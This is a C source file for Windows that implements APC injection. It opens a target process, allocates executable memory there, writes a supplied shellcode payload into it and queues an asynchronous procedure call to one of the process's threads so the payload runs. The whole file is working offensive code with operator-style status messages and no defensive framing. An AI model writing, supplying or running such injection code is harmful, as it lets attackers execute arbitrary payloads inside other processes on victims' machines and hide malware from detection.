#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

// APC Injection Implementation
// Injects shellcode into a remote process by queueing an Asynchronous Procedure Call (APC) to a thread.

DWORD FindTargetThread(DWORD processId) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    THREADENTRY32 te;
    te.dwSize = sizeof(THREADENTRY32);

    if (Thread32First(hSnapshot, &te)) {
        do {
            if (te.th32OwnerProcessID == processId) {
                CloseHandle(hSnapshot);
                return te.th32ThreadID;
            }
        } while (Thread32Next(hSnapshot, &te));
    }

    CloseHandle(hSnapshot);
    return 0;
}

bool InjectAPC(DWORD processId, PBYTE payload, SIZE_T payloadSize) {
    HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, processId);
    if (!hProcess) {
        printf("[-] Failed to open process.\n");
        return false;
    }

    PVOID pRemoteMem = VirtualAllocEx(hProcess, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pRemoteMem) {
        printf("[-] Failed to allocate memory in remote process.\n");
        CloseHandle(hProcess);
        return false;
    }

    SIZE_T bytesWritten;
    if (!WriteProcessMemory(hProcess, pRemoteMem, payload, payloadSize, &bytesWritten)) {
        printf("[-] Failed to write payload to remote process.\n");
        VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    DWORD threadId = FindTargetThread(processId);
    if (!threadId) {
        printf("[-] Failed to find thread in target process.\n");
        VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, threadId);
    if (!hThread) {
        printf("[-] Failed to open thread.\n");
        VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    if (!QueueUserAPC((PAPCFUNC)pRemoteMem, hThread, NULL)) {
        printf("[-] Failed to queue APC.\n");
        CloseHandle(hThread);
        VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    printf("[+] APC queued successfully. Payload will execute when the thread enters an alertable state.\n");

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return true;
}
